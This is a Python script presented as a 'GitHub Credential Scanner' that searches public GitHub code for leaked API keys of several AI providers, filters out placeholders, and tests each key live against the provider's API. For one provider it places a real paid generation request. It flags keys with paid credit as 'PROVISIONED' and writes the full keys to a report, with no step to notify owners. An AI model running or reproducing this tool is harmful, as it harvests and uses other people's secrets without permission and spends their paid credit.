#!/usr/bin/env python3
"""
GitHub Credential Scanner - Multi-provider active key finder
Usage: python3 scanner.py --token GITHUB_PAT --validate --output report.json
"""
import argparse, urllib.request, json, re, base64, time, os
from datetime import datetime

PATTERNS = {
    'openrouter': r'sk-or-v1-[a-f0-9]{64}',
    'fal': r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}:[a-f0-9]{32}',
    'openai': r'sk-proj-[a-zA-Z0-9_\-]{40,}',
    'groq': r'gsk_[a-zA-Z0-9]{52,}',
    'google_ai': r'AIzaSy[a-zA-Z0-9_-]{33}',
    'anthropic': r'sk-ant-api03-[a-zA-Z0-9_-]{93,}',
    'replicate': r'r8_[a-zA-Z0-9]{32,40}',
}
PLACEHOLDERS = ['example','placeholder','your_key','your-api','your-fal','xxx','dummy','fake','test_','sample','changeme','todo','YOUR_','INSERT','REPLACE']

KEYWORDS = ['learning','tutorial','demo','practice','starter','quickstart','chatbot','agent','rag',
    'saas','production','deploy','dashboard','admin','api','service','backend','server','platform',
    'hackathon','playground','sandbox','experiment','discord-bot','webhook','langchain','assignment']

def validate(provider, key):
    try:
        if provider == 'openrouter':
            r = urllib.request.urlopen(urllib.request.Request('https://openrouter.ai/api/v1/auth/key', headers={'Authorization': f'Bearer {key}'}), timeout=10)
            d = json.loads(r.read()).get('data', {})
            free = d.get('is_free_tier', True); limit = d.get('limit')
            if not free or (limit is not None and limit > 0): return f'PROVISIONED free={free} limit={limit} ${d.get("usage",0):.2f}'
            return f'FREE ${d.get("usage",0):.2f}'
        elif provider == 'fal':
            r = urllib.request.urlopen(urllib.request.Request('https://queue.fal.run/fal-ai/flux/schnell',
                headers={'Authorization': f'Key {key}', 'Content-Type': 'application/json'},
                data=json.dumps({"prompt":"t","num_images":1}).encode(), method='POST'), timeout=15)
            return 'PROVISIONED'
        elif provider == 'openai':
            r = urllib.request.urlopen(urllib.request.Request('https://api.openai.com/v1/models', headers={'Authorization': f'Bearer {key}'}), timeout=10)
            return f'ACTIVE({len(json.loads(r.read()).get("data",[]))})'
        elif provider == 'groq':
            r = urllib.request.urlopen(urllib.request.Request('https://api.groq.com/openai/v1/models', headers={'Authorization': f'Bearer {key}'}), timeout=10)
            return 'ACTIVE'
        elif provider == 'google_ai':
            r = urllib.request.urlopen(urllib.request.Request(f'https://generativelanguage.googleapis.com/v1beta/models?key={key}'), timeout=10)
            return 'ACTIVE'
        elif provider == 'anthropic':
            r = urllib.request.urlopen(urllib.request.Request('https://api.anthropic.com/v1/models', headers={'x-api-key': key, 'anthropic-version': '2023-06-01'}), timeout=10)
            return f'ACTIVE({len(json.loads(r.read()).get("data",[]))})'
        elif provider == 'replicate':
            r = urllib.request.urlopen(urllib.request.Request('https://api.replicate.com/v1/models', headers={'Authorization': f'Token {key}'}), timeout=10)
            return 'ACTIVE'
    except urllib.error.HTTPError as e:
        if e.code == 401: return 'EXPIRED'
        if e.code == 403:
            try: body = e.read().decode()[:80]
            except: body = ''
            if 'Exhausted' in body: return 'EXHAUSTED'
            return 'ACTIVE(restricted)'
        if e.code == 402: return 'NO_CREDITS'
        return f'HTTP{e.code}'
    except: return 'ERR'

def check_keys(content, source, headers, do_validate):
    found = []
    for provider, pattern in PATTERNS.items():
        for m in re.finditer(pattern, content):
            key = m.group(0)
            ctx = content[max(0, m.start()-50):m.end()+50]
            if any(p in ctx.lower() for p in PLACEHOLDERS) or len(set(key.replace('-','').replace(':',''))) < 8:
                continue
            if any(f['key'] == key for f in found):
                continue
            status = validate(provider, key) if do_validate else 'NOT_VALIDATED'
            found.append({'provider': provider, 'key': key, 'source': source, 'status': status})
    return found

def main():
    parser = argparse.ArgumentParser(description='GitHub Credential Scanner')
    parser.add_argument('--token', required=True, help='GitHub PAT')
    parser.add_argument('--validate', action='store_true', help='Validate found keys')
    parser.add_argument('--output', default='report.json', help='Output file')
    parser.add_argument('--keywords', default=','.join(KEYWORDS), help='Comma-separated keywords')
    parser.add_argument('--providers', default=','.join(PATTERNS.keys()), help='Comma-separated providers')
    args = parser.parse_args()

    headers = {"Authorization": f"token {args.token}", "Accept": "application/vnd.github.v3+json", "User-Agent": "scanner"}
    keywords = args.keywords.split(',')
    providers = [p for p in args.providers.split(',') if p in PATTERNS]
    all_findings = []

    for kw in keywords:
        for provider in providers:
            prefix = PATTERNS[provider].split('[')[0][:10]
            for ft in ['env', 'conf', 'cfg', 'py', 'js', 'json', 'yaml', 'yml']:
                q = f'{prefix} filename:.{ft} "{kw}"'
                try:
                    url = f'https://api.github.com/search/code?q={urllib.request.quote(q)}&per_page=15'
                    items = json.loads(urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=10).read()).get('items', [])
                    for item in items[:8]:
                        repo = item['repository']['full_name']; path = item['path']
                        try:
                            d = json.loads(urllib.request.urlopen(urllib.request.Request(
                                f'https://api.github.com/repos/{repo}/contents/{urllib.request.quote(path, safe="/")}',
                                headers=headers), timeout=10).read())
                            if d.get('encoding') == 'base64':
                                content = base64.b64decode(d['content']).decode('utf-8', errors='replace')
                                found = check_keys(content, f'{repo}/{path}', headers, args.validate)
                                all_findings.extend(found)
                                for f in found:
                                    mark = ' *** PROVISIONED ***' if 'PROVISIONED' in f['status'] else ''
                                    print(f'[{f["provider"]}] {f["key"][:16]}...{f["key"][-8:]} -> {f["status"]}{mark}')
                        except: pass
                        time.sleep(0.3)
                except urllib.error.HTTPError as e:
                    if e.code == 403: time.sleep(60)
                except: pass
                time.sleep(2)
        time.sleep(1)

    active = [f for f in all_findings if any(s in f.get('status','') for s in ['PROVISIONED','ACTIVE','FREE'])]
    report = {'timestamp': datetime.utcnow().isoformat(), 'total': len(all_findings), 'active': len(active), 'findings': all_findings}
    with open(args.output, 'w') as fp: json.dump(report, fp, indent=2)
    print(f'\nTotal: {len(all_findings)}, Active: {len(active)}')
    print(f'Saved: {args.output}')

if __name__ == '__main__':
    main()
